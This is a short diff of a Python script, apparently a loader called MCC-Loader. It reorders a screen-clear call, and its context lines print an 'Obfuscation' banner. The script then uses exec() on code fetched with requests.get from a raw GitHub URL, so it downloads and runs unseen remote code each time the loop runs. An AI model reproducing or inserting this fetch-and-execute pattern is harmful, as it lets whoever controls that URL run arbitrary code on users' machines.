@@ -26,7 +26,7 @@ Obfuscation = """
 print(Obfuscation)
 while True:
     print(Obfuscation)
-    os.system('cls')
     msvcrt.getch()
+    os.system('cls')
     print("Leaving Credit")
     exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Main').text)
